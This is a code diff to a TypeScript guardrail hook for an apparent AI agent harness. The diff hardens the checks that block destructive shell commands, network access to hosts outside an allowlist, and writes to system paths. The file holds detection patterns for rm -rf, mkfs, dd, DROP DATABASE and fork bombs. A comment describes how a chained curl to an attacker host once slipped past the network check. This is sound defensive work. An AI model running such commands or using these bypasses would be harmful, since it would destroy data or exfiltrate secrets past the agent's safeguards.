@@ -28,10 +28,10 @@ const KNOWN_SUBAGENTS = new Set([
 const DESTRUCTIVE_PAYLOAD = String.raw`(?:rm\s+-[^\s]*[rR][^\s]*[fF]?[^\s]*\s+(?:\/|~|\.)|mkfs\b|dd\s+if=|DROP\s+(?:DATABASE|TABLE|SCHEMA)\b|TRUNCATE\s+TABLE\b|chmod\s+(?:-[^\s]*[rR][^\s]*\s+)?777\s+\/|:\(\)\s*\{)`;
 
 const DESTRUCTIVE_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
-  // Catastrophic file deletion
-  { pattern: /rm\s+-[^\s]*r[^\s]*f[^\s]*\s+\/(?:\s|$)/, reason: "Blocked: rm -rf / — catastrophic filesystem deletion" },
-  { pattern: /rm\s+-[^\s]*r[^\s]*f[^\s]*\s+~/, reason: "Blocked: rm -rf ~ — home directory deletion" },
-  { pattern: /rm\s+-[^\s]*r[^\s]*f[^\s]*\s+\.\s*$/, reason: "Blocked: rm -rf . — current directory deletion" },
+  // Catastrophic `rm -rf` deletion is handled by isCatastrophicRm() (token-aware,
+  // so flag order/long flags/globs like `rm -fr /`, `rm -rf /*`, `rm -r -f /`
+  // can't slip past a brittle regex). The nested-shell / $(...) / backtick
+  // wrappers below still carry an rm sub-pattern for defense-in-depth.
 
   // Git force push to protected branches
   { pattern: /git\s+push\s+.*--force.*\b(main|master|production|release)\b/, reason: "Blocked: force push to protected branch" },
@@ -86,6 +86,48 @@ const DESTRUCTIVE_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
   { pattern: /ruby\s+-e\s.*(?:Kernel\.system|system\s*\(|exec\s*\(|File\.delete|FileUtils\.rm|%x\s*[\(\{])/, reason: "Blocked: ruby -e with system-level operation" },
 ];
 
+// Token-aware catastrophic `rm` detection. A brittle regex misses flag
+// reordering (`rm -fr /`), separated flags (`rm -r -f /`), long flags
+// (`rm --recursive --force /`), and globs (`rm -rf /*`). We instead tokenize,
+// collect the recursive+force flags for each `rm` invocation, and check the
+// target against a small set of catastrophic paths.
+const RM_DANGEROUS_TARGETS = new Set([
+  "/", "/*", "~", "~/", ".", "./", "$HOME", "${HOME}", "$HOME/", "${HOME}/",
+]);
+
+function stripQuotes(tok: string): string {
+  return tok.replace(/^['"`]+/, "").replace(/['"`]+$/, "");
+}
+
+function isCatastrophicRm(command: string): boolean {
+  const tokens = command.split(/\s+/).map(stripQuotes).filter(Boolean);
+  for (let i = 0; i < tokens.length; i++) {
+    if (tokens[i] !== "rm") continue;
+    let hasR = false;
+    let hasF = false;
+    const targets: string[] = [];
+    for (let j = i + 1; j < tokens.length; j++) {
+      const t = tokens[j];
+      if (t === "--recursive") { hasR = true; continue; }
+      if (t === "--force") { hasF = true; continue; }
+      if (t.startsWith("-") && t.length > 1 && !t.startsWith("--")) {
+        if (/[rR]/.test(t)) hasR = true;
+        if (/f/.test(t)) hasF = true;
+        continue;
+      }
+      // Target region — stop at a shell-command boundary so we don't pull
+      // targets from a following command (`rm -rf build && echo /`).
+      const sep = t.search(/[;&|]/);
+      if (sep === 0) break;
+      const target = sep === -1 ? t : t.slice(0, sep);
+      if (target) targets.push(target);
+      if (sep !== -1) break;
+    }
+    if (hasR && hasF && targets.some((t) => RM_DANGEROUS_TARGETS.has(t))) return true;
+  }
+  return false;
+}
+
 // ---------------------------------------------------------------------------
 // Network policy (Bash tool) — only allow known package registries
 // ---------------------------------------------------------------------------
@@ -137,45 +179,48 @@ function extractHostFromUrl(url: string): string | null {
   }
 }
 
-function extractHostFromCommand(command: string): string | null {
-  // Match URLs in the command
-  const urlMatch = command.match(/https?:\/\/([^\/\s:]+)/);
-  if (urlMatch) return urlMatch[1];
+/**
+ * Extract EVERY host referenced by a (possibly chained) command. Checking only
+ * the first URL let `curl https://ok.com && curl https://attacker.com` exfiltrate
+ * — the first host was allowed, so the whole call passed. We now collect all
+ * URLs and all socat/ssh/scp/rsync/nc targets so the network check can reject
+ * if ANY of them is disallowed.
+ */
+function extractAllHosts(command: string): string[] {
+  const hosts = new Set<string>();
+  const add = (h: string | undefined | null) => {
+    if (h) hosts.add(h.toLowerCase());
+  };
 
-  // Match bare hostnames after curl/wget
-  const hostMatch = command.match(/(?:curl|wget)\s+(?:-[^\s]+\s+)*([^\s\-][^\s]*)/);
-  if (hostMatch) {
+  for (const m of command.matchAll(/https?:\/\/([^\/\s:"'`]+)/gi)) add(m[1]);
+  for (const m of command.matchAll(/(?:TCP[46]?|UDP[46]?|OPENSSL|SSL):([^:\s,"'`]+):/gi)) add(m[1]);
+  for (const m of command.matchAll(/\b(?:ssh|scp|rsync)\s+(?:-[^\s]+\s+)*(?:[^\s@]+@)?([a-zA-Z0-9][a-zA-Z0-9.-]*)/g)) add(m[1]);
+  for (const m of command.matchAll(/\b(?:nc|ncat|netcat)\s+(?:-[^\s]+\s+)*([a-zA-Z0-9][a-zA-Z0-9.-]*)\s+\d+/g)) add(m[1]);
+
+  // Bare curl/wget targets (no scheme). Only count tokens that look like a
+  // hostname (contain a dot) so flag values like `-X POST` aren't misread.
+  for (const m of command.matchAll(/\b(?:curl|wget)\s+(?:-[^\s]+\s+)*([^\s\-][^\s]*)/g)) {
+    let host: string;
     try {
-      const parsed = new URL(hostMatch[1]);
-      return parsed.hostname;
+      host = new URL(m[1]).hostname;
     } catch {
-      return hostMatch[1].split("/")[0];
+      host = m[1].split("/")[0];
     }
+    if (host && host.includes(".")) add(host);
   }
 
-  // socat: TCP:host:port, TCP4:host:port, OPENSSL:host:port, SSL:host:port, etc.
-  const socatMatch = command.match(/(?:TCP[46]?|UDP[46]?|OPENSSL|SSL):([^:\s,]+):/i);
-  if (socatMatch) return socatMatch[1];
-
-  // ssh / scp: user@host or just host
-  const sshMatch = command.match(/\b(?:ssh|scp|rsync)\s+(?:-[^\s]+\s+)*(?:[^\s@]+@)?([a-zA-Z0-9][a-zA-Z0-9.-]*)/);
-  if (sshMatch) return sshMatch[1];
-
-  // nc/ncat/netcat: host port
-  const ncMatch = command.match(/\b(?:nc|ncat|netcat)\s+(?:-[^\s]+\s+)*([a-zA-Z0-9][a-zA-Z0-9.-]*)\s+\d+/);
-  if (ncMatch) return ncMatch[1];
-
-  return null;
+  return [...hosts];
 }
 
 function isHostAllowed(host: string): boolean {
+  const h = host.toLowerCase();
   const allAllowed = [
     ...ALLOWED_HOSTS,
     ...getExtraAllowedHosts(),
-  ];
+  ].map((a) => a.toLowerCase());
 
   return allAllowed.some(
-    (allowed) => host === allowed || host.endsWith(`.${allowed}`),
+    (allowed) => h === allowed || h.endsWith(`.${allowed}`),
   );
 }
 
@@ -183,13 +228,20 @@ function isHostAllowed(host: string): boolean {
 // File system policy (Write/Edit tools)
 // ---------------------------------------------------------------------------
 
+// Matched against the RESOLVED absolute path (path.resolve collapses `..` and
+// makes relative paths absolute) so traversal like `a/../../../etc/x` and
+// trailing-slash-less targets (`/root`) can't slip past.
 const BLOCKED_WRITE_PATHS = [
-  /^\/etc\//,
-  /^\/usr\//,
-  /^\/bin\//,
-  /^\/sbin\//,
-  /^\/root\//,
-  /\/\.ssh\//,
+  /^\/etc(\/|$)/,
+  /^\/usr(\/|$)/,
+  /^\/bin(\/|$)/,
+  /^\/sbin(\/|$)/,
+  /^\/root(\/|$)/,
+  /^\/var(\/|$)/,
+  /^\/opt(\/|$)/,
+  /^\/lib(\/|$)/,
+  /^\/boot(\/|$)/,
+  /\/\.ssh(\/|$)/,
   /\/\.bashrc$/,
   /\/\.bash_profile$/,
   /\/\.zshrc$/,
@@ -255,14 +307,27 @@ function evaluate(
   if (toolName === "Bash") {
     const command = (toolInput.command as string) || "";
 
+    if (isCatastrophicRm(command)) {
+      return "Blocked: rm -rf of a catastrophic target (/, /*, ~, .) — refusing recursive force-delete of a root/home/cwd path.";
+    }
+
     for (const { pattern, reason } of DESTRUCTIVE_PATTERNS) {
       if (pattern.test(command)) return reason;
     }
 
     if (NETWORK_COMMANDS.test(command)) {
-      const host = extractHostFromCommand(command);
-      if (host && !isHostAllowed(host)) {
-        return `Blocked: network access to '${host}' is not allowed. Use the WebFetch tool for web requests, or add the host to ALLOWED_HOSTS.`;
+      // Check EVERY host in the (possibly chained) command, not just the first.
+      const hosts = extractAllHosts(command);
+      if (hosts.length === 0) {
+        // A recognized network tool (curl/wget/nc/ssh/...) but we couldn't
+        // resolve a host to check (URL hidden in a variable, a file via -K,
+        // an unparsed flag, a listening socket). Fail CLOSED.
+        return "Blocked: network command with no resolvable host to check (target hidden in a variable, file, or unparsed flag). Use the WebFetch tool, or pass an explicit allowed URL.";
+      }
+      for (const host of hosts) {
+        if (!isHostAllowed(host)) {
+          return `Blocked: network access to '${host}' is not allowed. Use the WebFetch tool for web requests, or add the host to ALLOWED_HOSTS.`;
+        }
       }
     }
 
@@ -279,9 +344,12 @@ function evaluate(
   // --- Write/Edit guardrails ---
   if (toolName === "Write" || toolName === "Edit") {
     const filePath = (toolInput.file_path as string) || "";
+    // Resolve BEFORE matching so `..` traversal and trailing-slash-less targets
+    // can't dodge the system-path block.
+    const resolvedFilePath = filePath ? resolvePath(filePath) : "";
     for (const pattern of BLOCKED_WRITE_PATHS) {
-      if (pattern.test(filePath)) {
-        return `Blocked: writing to '${filePath}' is not allowed. System and dotfiles outside the project are protected.`;
+      if (pattern.test(resolvedFilePath)) {
+        return `Blocked: writing to '${filePath}' (resolves to '${resolvedFilePath}') is not allowed. System and dotfiles outside the project are protected.`;
       }
     }
 
